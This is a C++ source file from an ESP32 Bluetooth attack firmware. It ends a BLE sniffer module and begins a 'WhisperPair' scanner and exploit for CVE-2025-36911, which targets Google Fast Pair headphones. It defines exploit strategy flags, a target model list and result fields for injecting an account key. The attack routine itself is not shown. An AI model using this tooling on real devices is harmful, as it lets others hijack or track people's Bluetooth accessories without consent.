rgomez31UAQ/ESP32-DIV_CYD-Gadget/bluetooth_attacks.cpp
    // Process pending device from BLE callback
    if (pendingReady) {
        addOrUpdateDevice(pendingMAC, pendingRSSI, pendingName,
                          pendingHasName, pendingMfgData, pendingMfgLen);
        pendingReady = false;
    }

    // Throttled display update (500ms)
    unsigned long now = millis();
    if (now - lastDisplayUpdate > 500 && !detailView) {
        drawHeader();
        drawDeviceList();
        drawStatsLine();
        drawButtonBar();
        lastDisplayUpdate = now;
    }

    // Touch handling — ALL navigation goes through handleTouch()
    // DO NOT use buttonPressed() — CYD touch zones (BTN_BACK=x160-240 y0-60,
    // BTN_UP=x0-80 y0-60, BTN_SELECT=x80-160 y130-190) overlap our icon bar
    // and device list, causing phantom exits and misfires
    handleTouch();

    // Physical BOOT button — uses IS_BOOT_PRESSED() macro (returns false on E32R28T
    // where GPIO0 is permanently LOW due to CC1101 E07 PA module)
    static unsigned long lastBootPress = 0;
    if (IS_BOOT_PRESSED() && millis() - lastBootPress > 500) {
        lastBootPress = millis();
        if (detailView) {
            detailView = false;
            waitForRelease = true;
            drawFullUI();
        } else {
            exitRequested = true;
        }
    }
}

bool isExitRequested() { return exitRequested; }

void cleanup() {
    if (pBleScan) {
        if (scanning) pBleScan->stop();
        pBleScan->setAdvertisedDeviceCallbacks(nullptr, false);  // Deregister callback so BleScan gets clean scan object
    }
    scanning = false;
    BLEDevice::deinit(false);  // MUST be false — deinit(true) bug never resets initialized flag
    pBleScan = nullptr;
    initialized = false;
    exitRequested = false;
    detailView = false;
    waitForRelease = false;
    pendingReady = false;

    // Restore WiFi for other modules
    WiFi.mode(WIFI_STA);

    #if CYD_DEBUG
    Serial.println("[BSNIFF] Cleanup complete — deinit(false)");
    #endif
}

}  // namespace BleSniffer


// ═══════════════════════════════════════════════════════════════════════════
// WHISPERPAIR - CVE-2025-36911 Fast Pair Vulnerability Scanner
// Scans for Google Fast Pair devices and probes for WhisperPair vulnerability
// Phase 1: Discovery + GATT Service Probe
// ═══════════════════════════════════════════════════════════════════════════

namespace WhisperPair {

// ─── Constants ───────────────────────────────────────────────────────────
#define WP_MAX_DEVICES 16
#define WP_LINE_HEIGHT 16
#define WP_MAX_VISIBLE 12
#define WP_SCAN_SECS 8

// ─── Probe Result Codes ──────────────────────────────────────────────────
#define WPR_NONE        0   // Not probed yet
#define WPR_UNREACHABLE 1   // GATT connection failed
#define WPR_NO_SERVICE  2   // Fast Pair service not found
#define WPR_NO_CHAR     3   // KBP characteristic not found (patched)
#define WPR_EXPOSED     4   // KBP char found outside pairing mode
#define WPR_VULNERABLE  5   // Device responded to KBP request

// ─── Known Fast Pair Model IDs ───────────────────────────────────────────
// Same model IDs as BleSpoofer FAST_PAIR_MODELS array (verified working)
struct WPModel {
    uint8_t id[3];
    const char* name;
};

static const WPModel wpModels[] = {
    {{0xD9, 0x93, 0x30}, "Pixel Buds Pro"},
    {{0x82, 0x1F, 0x66}, "Pixel Buds A"},
    {{0x71, 0x7F, 0x41}, "Pixel Buds"},
    {{0xF5, 0x24, 0x94}, "Sony WH-XM4"},
    {{0xF0, 0x09, 0x17}, "Sony WH-XM5"},
    {{0x01, 0x00, 0x06}, "Bose NC 700"},
    {{0xEF, 0x44, 0x63}, "Bose QC Ultra"},
    {{0x03, 0x1E, 0x06}, "JBL Flip 6"},
    {{0x92, 0xB2, 0x5E}, "JBL LivePro2"},
    {{0x1E, 0x89, 0xA7}, "Razer HH"},
    {{0x02, 0xAA, 0x91}, "Jabra 75t"},
    {{0x2D, 0x7A, 0x23}, "Nothing Ear1"},
    {{0xD4, 0x46, 0xA7}, "Sony LinkBuds"},
    {{0x72, 0xEF, 0x62}, "Gal Buds FE"},
    {{0xF5, 0x8D, 0x14}, "JBL Buds Pro"},
};
#define WP_MODEL_COUNT (sizeof(wpModels) / sizeof(wpModels[0]))

// ─── Device Info ─────────────────────────────────────────────────────────
struct FPDevice {
    char addrStr[18];               // "AA:BB:CC:DD:EE:FF"
    esp_ble_addr_type_t addrType;
    uint32_t modelId;
    int rssi;
    char name[24];
    uint8_t result;                 // WPR_* code
};

// ─── State ───────────────────────────────────────────────────────────────
static bool wpInit = false;
static bool wpExit = false;
static bool inResult = false;
static FPDevice wpDevs[WP_MAX_DEVICES];
static int wpCount = 0;
static int wpCurIdx = 0;
static int wpListStart = 0;
static int wpProbeIdx = -1;
static BLEScan* pWpScan = nullptr;
static BLEClient* pWpClient = nullptr;
static volatile bool wpNotifRx = false;
static uint8_t wpNotifData[20];
static size_t wpNotifLen = 0;

// GATT UUIDs
static BLEUUID wpFpUUID16((uint16_t)0xFE2C);
static BLEUUID wpFpUUID128("0000fe2c-0000-1000-8000-00805f9b34fb");
static BLEUUID wpKbpUUID("fe2c1234-8366-4814-8eb0-01de32100bea");

// Icon bar
static int wpIconX[2] = {210, 10};
static int wpIconY = 20;

// Attack-phase UUIDs created as locals in wpRunAttack() to save DRAM

// ─── KBP Exploit Strategies ─────────────────────────────────────────────
struct WPStrategy {
    const char* name;
    uint8_t flags;
};

static const WPStrategy wpStrategies[] = {
    {"RAW_KBP",      0x11},
    {"WITH_SEEKER",  0x02},
    {"RETROACTIVE",  0x0A},
    {"EXTENDED",     0x10},
};

// ─── Attack Result ──────────────────────────────────────────────────────
struct WPAttackResult {
    bool phase1Done;
    bool phase2Done;
    bool phase3Done;
    int  strategyUsed;          // which strategy got first response (-1 = none)
    uint8_t brEdrAddr[6];       // extracted BR/EDR (Classic BT) address
    bool hasBrEdr;
    uint8_t kbpResp[20];        // raw KBP notification response
    size_t  kbpRespLen;
    bool acctKeyWritten;        // Phase 2 success
    uint8_t acctKey[16];        // the account key we injected
    bool hasPasskey;            // Phase 3 — passkey char exists
    bool hasAdditional;         // Phase 3 — additional data char exists
    uint8_t modelIdBytes[3];    // from GATT char read
    bool hasModelId;
    char firmware[20];          // firmware revision string
    bool hasFirmware;
    uint8_t strategyResults[4]; // 0=not tried, 1=fail, 2=success
};

// ─── Attack State ───────────────────────────────────────────────────────
static bool inAttack = false;
static bool inAttackResult = false;
static int  atkResultPage = 0;
static WPAttackResult wpAtkResult;

// ─── Attack Scrolling Log ───────────────────────────────────────────────
#define WP_ATK_LOG_LINES 10
#define WP_ATK_LOG_WIDTH 36
static char wpAtkLog[WP_ATK_LOG_LINES][WP_ATK_LOG_WIDTH];
static uint16_t wpAtkLogColors[WP_ATK_LOG_LINES];
static int wpAtkLogCount = 0;

// ─── Helpers ─────────────────────────────────────────────────────────────
static const char* wpLookupModel(uint32_t mid) {
    for (int i = 0; i < (int)WP_MODEL_COUNT; i++) {
        uint32_t m = ((uint32_t)wpModels[i].id[0] << 16) |
                     ((uint32_t)wpModels[i].id[1] << 8) |
                     wpModels[i].id[2];
        if (m == mid) return wpModels[i].name;
    }
    return nullptr;
}

static const char* wpResultStr(uint8_t r) {
    switch (r) {
        case WPR_UNREACHABLE: return "UNREACHABLE";
        case WPR_NO_SERVICE:  return "NO FP SERVICE";
        case WPR_NO_CHAR:     return "SECURE";
        case WPR_EXPOSED:     return "EXPOSED";
        case WPR_VULNERABLE:  return "VULNERABLE";
        default:              return "NOT TESTED";
    }
}

static uint16_t wpResultColor(uint8_t r) {
    switch (r) {
        case WPR_NO_CHAR:     return 0x07E0;   // Green
        case WPR_EXPOSED:     return 0xFFE0;   // Yellow
        case WPR_VULNERABLE:  return 0xF800;   // Red
        default:              return HALEHOUND_GUNMETAL;
    }
}

// ─── Notification Callback ───────────────────────────────────────────────
static void wpNotifyCb(BLERemoteCharacteristic* pChar, uint8_t* data, size_t len, bool isNotify) {
    wpNotifRx = true;
    wpNotifLen = (len > 20) ? 20 : len;
    memcpy(wpNotifData, data, wpNotifLen);
    #if CYD_DEBUG
    Serial.printf("[WP] KBP notification received! len=%d\n", len);
    for (size_t i = 0; i < wpNotifLen; i++) Serial.printf("%02X ", wpNotifData[i]);
    Serial.println();
    #endif
}

// ─── UI Drawing ──────────────────────────────────────────────────────────
static void wpDrawHeader() {
    tft.drawLine(0, 19, tft.width(), 19, HALEHOUND_MAGENTA);
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_DARK);
    tft.drawBitmap(wpIconX[0], wpIconY, bitmap_icon_undo, 16, 16, HALEHOUND_MAGENTA);
    tft.drawBitmap(wpIconX[1], wpIconY, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
    // Nosifer glitch title — chromatic aberration effect
    drawGlitchTitle(55, "WHISPERPAIR");
    // CVE subtitle centered in electric blue
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA);
    int cveW = 14 * 6;
    tft.setCursor((SCREEN_WIDTH - cveW) / 2, 68);
    tft.print("CVE-2025-36911");
}

